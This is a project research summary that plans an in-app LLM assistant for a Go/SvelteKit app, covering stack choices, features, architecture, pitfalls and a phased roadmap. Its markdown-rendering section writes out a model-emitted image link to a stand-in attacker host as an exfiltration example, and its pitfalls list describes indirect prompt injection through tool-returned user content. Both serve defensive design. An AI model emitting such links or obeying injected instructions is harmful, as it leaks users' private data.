# Project Research Summary

**Project:** Perspectize v1.2 — Jeeves AI Assistant
**Domain:** In-app LLM assistant (tool-using agent) added to an existing Go/gqlgen hexagonal backend + SvelteKit frontend
**Researched:** 2026-09-26
**Confidence:** HIGH (stack/architecture, verified against codebase and SDK source), MEDIUM (features/UX conventions, pitfalls involving OpenRouter behavior)

## Executive Summary

Jeeves is a "how-to help + perspective-refinement" copilot, built the way capable teams build embedded AI assistants in 2026: a provider-neutral Go core (own message/event/tool types, never SDK types) wrapping a hand-written agent loop, a narrow per-page tool registry backed by a `PerspectizeData` port with three implementations (GraphQL for `botler`/future MCP, fixtures for evals, in-process services for the live app), and streaming delivered over the existing authenticated GraphQL-subscription WebSocket rather than a new transport. The recommended stack is deliberately official-SDK-first (`anthropic-sdk-go` v1.75.0, later `openai-go/v3` for OpenRouter, `google/jsonschema-go` for schema generation/validation) with a small in-house eval harness rather than any Go agent framework, because every framework surveyed (LangChainGo, Genkit Go, Eino) hides the agent loop the owner is explicitly trying to learn and lags Anthropic's newest features (adaptive thinking, effort levels, tool search). Feature scope follows an explicit capability ladder — Tell (guide-grounded how-to, citations, honest "not a feature") -> Look (privacy-respecting read tools, visible tool activity, page context) -> Do-with-confirmation (diff-card proposals, never silent writes) — and defers autonomous actions, server-side history, credits/BYOK, and the remote MCP server to later milestones.

The dominant risk is not the LLM integration itself but three codebase-specific traps that research found already latent in the repo: (1) the single-perspective privacy check lives in the GraphQL resolver, not `PerspectiveService`, so an in-process tool implementation that calls the service directly will leak other users' PRIVATE perspectives unless that check is pushed into the service first and covered by one contract test run against all three `PerspectizeData` implementations; (2) the existing per-process HTTP rate limiter cannot see individual messages on a long-lived GraphQL subscription, so token/cost budgets and concurrency caps must live in the Jeeves service layer, keyed by Clerk user ID, backed by Postgres for cross-instance budget tracking; and (3) assistant markdown rendering intersects with an existing permissive CSP (`img-src https:`) and DOMPurify defaults that allow `<img>`, creating a zero-click exfiltration path for private data via image URLs — this must be closed with a dedicated, image-free assistant renderer before any tool that can read private or untrusted content ships. A fourth, purely mechanical risk is the Docker build context: once `backend/go.mod` gets a `replace` pointing at `../ai-tooling`, the Sevalla build breaks unless the context moves to the repo root with a matching root `.dockerignore` — this should land as its own low-risk bridge PR, verified with a deploy, before any backend code actually imports `ai-tooling`.

Overall the research is well-grounded: stack and architecture findings come from direct SDK source inspection and the actual codebase (privacy check location, WS transport, CSP config, rate limiter shape were all confirmed by reading repo files), and locked decisions in `ai-tooling/CLAUDE.md` are treated as fixed constraints rather than re-litigated. The softer areas are OpenRouter/OpenAI-compatible provider behavior (MEDIUM, official docs plus vendor blog posts) and general chat-UX conventions (MEDIUM, pattern-library sources rather than primary specs) — both are deferred to later phases (P-OpenRouter, in-app UI polish) where they can be re-verified against evals and against the owner's actual choices (UI placement, botler auth) which remain explicitly open.

## Key Findings

### Recommended Stack

Core: `anthropic-sdk-go` v1.75.0 for the Anthropic adapter (streaming via `Messages.NewStreaming` + `Message.Accumulate`, adaptive thinking + effort levels, prompt caching), `google/jsonschema-go` v0.4.3 for tool-schema generation and input validation (shared later with the official MCP Go SDK), and Go stdlib for the hand-written ~150-line agent loop — this is the teaching goal and must not be hidden behind a framework. `openai-go/v3` (Chat Completions, not Responses) is reserved for the later OpenRouter phase. `golang.org/x/time/rate` fills the gap the existing HTTP rate limiter can't cover (per-user token budget on a long-lived WS subscription). Frontend: reuse `graphql-ws`/existing WS client — no new transport; `marked` for incremental markdown parsing, reconciled with PITFALLS' image-exfiltration warning below. `ai-tooling` is a sibling Go module joined to `backend` via a `replace` directive (not `go.work`), imported only in the direction `backend -> ai-tooling`.

**Core technologies:**
- `anthropic-sdk-go` v1.75.0 — Anthropic adapter — official SDK, covers streaming/accumulation/tool-results/caching/usage without leaking SDK types if kept adapter-internal
- `google/jsonschema-go` v0.4.3 — tool schema gen + validation — zero non-stdlib deps, aligns with future MCP Go SDK
- `openai-go/v3` v3.66.0 — OpenRouter adapter (later phase) — official SDK, Chat Completions schema matches OpenRouter
- In-house eval harness (~300–500 lines) — no Go eval framework is worth adopting; ecosystem is thin and frameworks couple to their own client abstractions

**Reconciled tension — markdown rendering vs. image exfiltration:** STACK recommends `marked` + existing DOMPurify for assistant markdown; PITFALLS flags that the frontend CSP (`img-src 'self' data: https:`) plus DOMPurify's default allowance of `<img>` together create a zero-click data-exfiltration path (a model-emitted `![](https://evil.example/?d=<private text>)` is fetched automatically). **Resolution: use `marked` for parsing, but never reuse `SafeHtml` as-is for assistant output.** Build a dedicated `AssistantMessage` renderer with a DOMPurify config that forbids `img`, `iframe`, `form`, `style` tags entirely and allowlists link hosts (app routes, youtube.com), showing other URLs as plain text or behind a click-through affordance. Add a deterministic eval/unit-test check that assistant output never renders `<img>`. Tightening `img-src` in `app.html` as defense in depth is a good, separate, low-risk chore — check what else depends on `https:` first.

### Expected Features

**Must have (table stakes, "Tell" + "Look" rungs):** sidebar/sheet panel opened only on explicit action (never auto-opens — core "never interrupted" value); streaming with a real backend-cancelling Stop control; visible tool activity; guide-grounded how-to answers with citations; honest "I don't know / not a feature"; page-context awareness with a context chip; privacy-respecting read tools; new-chat/reset with session-persistent thread; per-user usage limits with calm, specific messaging; accessibility baseline (paced announcements, not per-token live-region spam; full keyboard operation; reduced motion); default "Jeevesbot" name, renamable in Settings; copy response; AI disclosure.

**Should have (differentiators, "Do with confirmation" rung):** Socratic/questions-first refinement as the default (not rewrites) with an explicit anti-sycophancy prompt stance and pushback evals; confirm-to-apply cards with an explicit diff, Apply/Dismiss as co-equal actions, and session Undo; summarize-the-range-of-perspectives and steelman/challenge mode (read-only, attributed); "show me where" deep links; a transparent "what I can see" tools/data panel; behavior toggles in Settings.

**Defer (v2+):** autonomous low-risk actions, server-side deletable conversation history, on-request content discovery, usage ledger/credits and BYOK (explicitly deferred in PROJECT.md), remote MCP server + OAuth.

**Anti-features to actively avoid:** proactive nudges/pop-ups, silent writes/auto-apply, sycophantic praise, fabricated features/UI, full ghost-writing, public "AI-written" badges, engagement-maximizing personality, reading others' private data/messages, voice/multimodal input, cheerful vague error copy.

### Architecture Approach

The system is layered as: frontend sidebar (reuses the existing `graphql-ws` socket) -> a new `assistantTurn` GraphQL subscription resolver (auth, input validation, rate-limit gate, delta batching) -> a backend `adapters/assistant` package (in-process `PerspectizeData`, turn runner, usage recorder, limits) -> the sibling `ai-tooling` module (provider-neutral `llm` types, the hand-written `agent` loop, `tools` registry, `jeeves` read-only tools, embedded `guide`, `evals`, `botler` CLI) -> the Anthropic (later OpenRouter) API. The critical architectural discipline is that neutral types never leak SDK or backend-domain shapes across either module boundary, and that all three `PerspectizeData` implementations (GraphQL, fixture, in-process) share one contract test suite so privacy behavior can't silently diverge.

**Major components:**
1. `ai-tooling/llm` + `llm/anthropic` — provider-neutral message/event/tool types and the Anthropic adapter; SDK types never escape the adapter package
2. `ai-tooling/agent` + `ai-tooling/tools` — the hand-written agent loop (round cap, cancellation, observer hooks) and the tool registry with per-page toolset subsets
3. `ai-tooling/jeeves` (+ `data/graphqlclient`, `data/fixture`) and `backend/internal/adapters/assistant` (in-process impl) — the `PerspectizeData` port and its three implementations, unified by a shared conformance test
4. `backend/assistant.graphql` + `resolvers/assistant.resolvers.go` — the subscription-as-request pattern (input on the subscription, batched text deltas, ctx-propagated cancellation)
5. `ai-tooling/guide` + `ai-tooling/evals` + `cmd/botler` — embedded, versioned app guide; deterministic eval harness gating model/provider changes; dev CLI over GraphQL

### Critical Pitfalls

1. **Privacy leak via the in-process `PerspectizeData` implementation** — `PerspectiveService.GetByID` has no visibility check (it lives only in the resolver today). Push the visibility rule into the service/core *before* building the in-process tool implementation, make the viewer an explicit required parameter everywhere, and run one contract test ("viewer B can't reach viewer A's private perspective by ID/list/search") against all three implementations.
2. **Indirect prompt injection via user-generated content returned by tools** — perspectives, reviews, YouTube titles are attacker-reachable text the model treats as instructions. Delimit/label untrusted fields, strip HTML and hidden Unicode, truncate long text, and add adversarial eval fixtures.
3. **Data leak through rendered assistant output (markdown images/links)** — see the reconciled recommendation above: dedicated no-`<img>` renderer with link allowlisting, plus a deterministic test.
4. **Cancelling the stream doesn't stop the upstream model call** — the subscription ctx must be the root context for the entire agent run (provider HTTP request, every tool call, every DB query), every channel send must `select` on `ctx.Done()`, and usage logging must use `context.WithoutCancel` so cancellation doesn't also lose the usage row.
5. **Runaway agent loops / unbounded cost** and **rate limits that don't cover subscriptions** — hard per-run limits (max rounds, tokens, wall-clock, repeat-call detection) belong in the agent loop itself; per-user token/cost budgets and one-active-turn-per-user belong in the Jeeves service layer (Postgres-backed for cross-instance correctness), not the existing per-process HTTP middleware.

## Implications for Roadmap

Numbering continues from the existing roadmap at **Phase 25**. Four groupings, matching the dependency structure found in all four research files (guide-before-UI, read-before-write, evals-before-provider-pivot) and the milestone's own "progressive, re-plan from what was learned" locked decision (#11).

### Phase 25: Foundation (ai-tooling core, Anthropic adapter, agent loop, app guide, read-only tools, botler, evals)
**Rationale:** Everything downstream depends on the neutral `llm` types, the hand-written agent loop, and the `PerspectizeData` port existing and being testable without touching the backend or paying for live API calls. This phase is entirely new code in the sibling `ai-tooling` module — zero backend import, zero production risk — so it can absorb the riskiest design decisions (neutral type shape, privacy-safe port design, guide structure) cheaply, and is where the teaching goal (owner writes one tool, one eval case) fits naturally.
**Delivers:** `ai-tooling` module skeleton + CI job; `llm` types + `Provider` port + fake provider; `agent` loop (round cap, parallel tool calls, cancellation, Observer) tested against the fake provider; `tools.Registry` with schema validation; `llm/anthropic` adapter; `jeeves.PerspectizeData` port + DTOs + fixture impl + shared conformance test (including a private-perspective case); embedded, page-scoped `guide` package with a frontend-reference drift check; `jeeves` read-only tools + `ToolsetFor(page)` + prompt assembly; `graphqlclient` impl + `botler` CLI (`tools list`, `tools call`, `chat`); the in-house eval harness with deterministic checks, fixture-only enforcement, and token/latency/tool-def-token capture.
**Addresses (FEATURES.md):** the "Tell" rung's grounding requirement (guide-grounded answers, honest "not a feature") and the privacy-respecting-reads table stake, built and tested before any live surface exists.
**Avoids (PITFALLS.md):** Pitfall 1 (privacy — contract test built here, before an in-process implementation exists), Pitfall 6 (leaky provider abstraction — neutral types designed against both wire formats and tested with a fake provider that emits both styles), Pitfall 5 (runaway loops — hard limits are part of the loop's contract from day one), Pitfall 10 (evals that lie — fixture-only enforcement, deterministic checks first).

### Phase 26: Bridge (Docker build-context move + privacy fix)
**Rationale:** Two small, independent, high-leverage changes that must land *before* the backend imports `ai-tooling`, called out explicitly in both STACK and ARCHITECTURE as their own low-risk PRs: moving the Sevalla Docker build context to the repo root (with a root `.dockerignore`) so `replace => ../ai-tooling` resolves in the image, and pushing the perspective-visibility check down from the resolver into `PerspectiveService` (resolver behavior unchanged, but now shared with the future in-process adapter). Keeping these separate from the code-import phase turns one risky infra-plus-code deploy into two boring, independently-verifiable ones.
**Delivers:** Sevalla context = repo root, `backend/Dockerfile` updated, root `.dockerignore` (excludes `frontend/`, `node_modules`, `.git`, `.planning`, `docs`, `graphify-out`, legacy `perspectize/`), a verified deploy; `PerspectiveService.GetByID`/`GetVisibleByID` (or equivalent) enforcing privacy with tests, resolver delegating to it.
**Addresses:** no new user-facing feature — this is pure risk reduction gating Phase 27.
**Avoids:** the Docker-context failure mode documented in STACK/ARCHITECTURE (build breaks the moment `replace` is added without this), and Pitfall 1 (privacy) from the service side, ahead of the in-process adapter's construction in Phase 27.

### Phase 27: In-app (subscription streaming, sidebar, per-page tools, confirm-to-apply, usage logging, rate limits)
**Rationale:** With Foundation and the Bridge in place, this is where the backend first imports `ai-tooling` and end users first see Jeeves. It bundles the "Look" and first slice of "Do with confirmation" rungs together because confirm-to-apply structurally requires the read tools (a diff needs the current value) and the same subscription/runner infrastructure.
**Delivers:** `replace`+`require` wired into `backend/go.mod`; `assistant_usage` and `users.assistant_name` migrations (write + review only, manual apply per environment, per repo convention); `adapters/assistant` (in-process `PerspectizeData` running the shared conformance suite, usage recorder using `context.WithoutCancel`, per-user turn limiter + daily token budget in the service layer, one-active-turn-per-user); `assistant.graphql` subscription + resolver with delta batching and full ctx-propagated cancellation; frontend sidebar, transcript store, tool-activity chips, Stop control, dedicated no-`<img>` assistant renderer, accessibility-paced announcements; `propose_perspective_edit` -> confirm card -> existing `updatePerspective` mutation (never a new write path); rename control wired to `setAssistantName`; typed rate-limit/budget errors surfaced through the subscription.
**Addresses (FEATURES.md):** the full P1 table-stakes list (streaming+Stop, citations, honest "not a feature", privacy-respecting tools + visible activity, Socratic refine + anti-sycophancy, usage limits, accessibility baseline, new chat, rename) plus the P2 confirm-to-apply/Undo differentiator.
**Avoids (PITFALLS.md):** Pitfall 3 (rendered-output leak — dedicated renderer ships here), Pitfall 4 (cancellation — ctx is the run root, `select` on `ctx.Done()` everywhere, `WithoutCancel` for usage writes), Pitfall 13 (rate limits missing the WS path — service-layer budget, not HTTP middleware), Pitfall 14 (WS streaming backpressure/reconnect — delta batching, runId idempotency, disabled client auto-retry for this subscription), Anti-Pattern 5 in ARCHITECTURE (agent never writes directly — confirm-to-apply reuses existing authenticated mutations).

### Phase 28: OpenRouter
**Rationale:** Locked decision 6 makes the eval matrix the explicit gate for this pivot — it must not start until the held-out eval set, N>=3 repetitions, and fixture-only enforcement exist from Phase 25/27. This phase is deliberately last because it is where the neutral-type design from Phase 25 gets stress-tested by a genuinely different wire format (OpenAI-compatible tool-call fragments, `role: tool` messages, `reasoning_details` round-tripping), and because model/provider quality varies enough (per PITFALLS' provider-variance data) that it needs its own allowlisted, eval-gated registry rather than open model selection.
**Delivers:** `llm/openrouter` adapter; model registry (model ID, pinned provider order, `require_parameters: true`, capability flags including `SupportsTools`); eval matrix run across models x prompt versions with a defined pass gate; provider/model selection wired into backend config; usage rows already carry provider/model from Phase 27.
**Addresses (FEATURES.md):** none directly user-facing — this is a stack/cost-flexibility phase, gated by evals rather than by a feature milestone.
**Avoids (PITFALLS.md):** Pitfall 7 (weak/variable OpenRouter tool support — registry rejects models lacking `tools` in `supported_parameters`, pins providers, records actual returned provider), Pitfall 6 (any neutral-type leaks discovered here are fixed with the fake-provider/loop tests limiting blast radius, per the Recovery Strategies table).

**Deferred to a later milestone (not in v1.2 scope):** credits/BYOK usage ledger, remote MCP server + OAuth — both explicitly out of scope per `ai-tooling/CLAUDE.md` locked decision 1 and PROJECT.md.

### Phase Ordering Rationale

- **Guide, tools, and evals must exist before any live surface** — FEATURES.md's dependency graph shows citations/hallucination-evals require guide entries as ground truth, and PITFALLS' Pitfall 10 ("evals that lie") requires the held-out set and fixture-only enforcement to exist before they can gate anything downstream.
- **Read precedes write, and write never bypasses existing mutations** — ARCHITECTURE's Pattern 4 (confirm-to-apply = proposal event + existing mutation) and FEATURES' dependency notes ("a diff needs the current value, so Look precedes Do") drove bundling confirm-to-apply into the same in-app phase as the read tools rather than a separate phase.
- **Infra risk (Docker context) is isolated from feature risk** — both STACK and ARCHITECTURE independently call for the build-context move to be its own small, verified-by-deploy PR before the backend's first `ai-tooling` import, which is why it's a standalone bridge phase rather than folded into "in-app."
- **The eval matrix gates the provider pivot, not the reverse** — locked decision 6 plus Pitfall 10's warning that a single-run gate is noise means OpenRouter cannot be phase-ordered earlier no matter how appealing cost savings are.

### Research Flags

Phases likely needing deeper research during planning:
- **Phase 27 (In-app):** the accessibility-paced-announcement pattern (avoiding live-region storms while still surfacing streaming state), and the exact reconnect/idempotency behavior of the installed `graphql-ws` client version, are both flagged MEDIUM/LOW confidence in PITFALLS and worth a focused `/gsd-research-phase` pass before implementation.
- **Phase 28 (OpenRouter):** reasoning-content round-trip rules vary per model and are LOW confidence per PITFALLS; needs verification against the specific models the registry ends up allowlisting.
- **Botler auth decision (spans Phase 25/27):** explicitly open in `ai-tooling/CLAUDE.md` (dev-only header vs. long-lived Clerk token) and flagged as a security-sensitive pitfall (Pitfall 11) — should be resolved with a short research/design pass before `botler`'s auth path is implemented, not decided ad hoc.

Phases with standard, well-documented patterns (skip research-phase):
- **Phase 25 (Foundation core/adapter/loop):** SDK APIs were verified directly against `anthropic-sdk-go` v1.75.0 source and official docs (HIGH confidence); the agent-loop shape is a well-established pattern.
- **Phase 26 (Bridge):** Docker/Go-module mechanics (`replace` directives, `.dockerignore` precedence, module layout) are standard Go tooling, verified against `go.dev/ref/mod` and Docker docs (HIGH confidence).

## Confidence Assessment

| Area | Confidence | Notes |
|------|------------|-------|
| Stack | HIGH | SDK versions/APIs read directly from module-proxy source and official docs; MEDIUM only on Sevalla build-context specifics and the eval-tooling judgment call |
| Features | MEDIUM | UX conventions cross-checked across several 2026 pattern-library and accessibility sources; no primary-spec source for UX conventions; locked decisions taken as given, not re-litigated |
| Architecture | HIGH for integration points (read directly from the codebase: privacy check location, WS transport, resolver patterns); MEDIUM for provider/SDK streaming behavior specifics |
| Pitfalls | HIGH for codebase-specific findings (all verified in-repo: privacy check location, CSP config, rate limiter shape, WS transport); MEDIUM for Anthropic behavior (official docs); MEDIUM for OpenRouter behavior (official docs + vendor blog, not independently verified) |

**Overall confidence:** HIGH for what to build and in what order; MEDIUM on OpenRouter-specific behavior and general chat-UX conventions, both appropriately deferred to phases where evals or further research can validate them before they gate anything.

### Gaps to Address

- **Botler auth (dev-header vs. Clerk token):** open decision with real security stakes (Pitfall 11); resolve during Phase 25/27 planning, preferring a real Clerk token over any bypass.
- **UI placement of the sidebar relative to existing dialogs (SettingsDialog, PerspectivePopover, AddVideoDialog):** open decision noted in FEATURES.md; needs a concrete z-order/focus decision during Phase 27 planning.
- **Free vs. Pro usage-limit tiering:** explicitly open in `ai-tooling/CLAUDE.md`; Phase 27 can ship with a flat per-user daily limit and defer tiering.
- **Whether Sevalla's builder honors Dockerfile-specific `.dockerignore` files (BuildKit feature):** flagged LOW confidence in STACK; verify during Phase 26 by inspecting the built image, falling back to a root `.dockerignore` if not honored.
- **Cache-hit strategy given per-page tool sets:** STACK/PITFALLS both flag that per-page toolsets break Anthropic's single-cache-prefix assumption; Phase 27 should measure actual cache-hit rate before deciding whether to accept the cost or switch to one stable tool set with availability toggled by instructions.

## Sources

### Primary (HIGH confidence)
- Go module proxy + `anthropic-sdk-go` v1.75.0 source, `openai-go/v3` source, `google/jsonschema-go` source — exact APIs, versions, Go-version requirements
- Repo files: `backend/cmd/server/main.go`, `backend/internal/adapters/graphql/resolvers/perspective.resolvers.go`, `gorm_perspective_repository.go`, `services/ratelimit.go`, `frontend/src/app.html`, `SafeHtml.svelte`, `backend/Dockerfile`, `.github/workflows/ci.yml`, `ai-tooling/CLAUDE.md` (locked decisions)
- https://platform.claude.com/docs (streaming, tool-use, thinking/effort, prompt caching, define-tools)
- https://go.dev/ref/mod, https://docs.docker.com/build/concepts/context/

### Secondary (MEDIUM confidence)
- https://openrouter.ai/docs (tool-calling, provider routing, reasoning tokens, usage accounting)
- OpenRouter blog (provider variance / Exacto routing)
- AI UX Playground, thefrontkit, TianPan (a11y), Orange accessibility guidelines — chat-UX and HITL pattern conventions
- Springer AI & Society / arXiv sycophancy taxonomy — sycophancy research motivating the anti-sycophancy stance

### Tertiary (LOW confidence)
- appliedgo.net Go AI ecosystem survey (context only)
- OpenRouter reasoning-content round-trip specifics per model (needs per-model verification at Phase 28)
- Clerk long-lived/machine-token feature availability for `botler` (needs verification at Phase 25/27)

---
*Research completed: 2026-09-26*
*Ready for roadmap: yes*
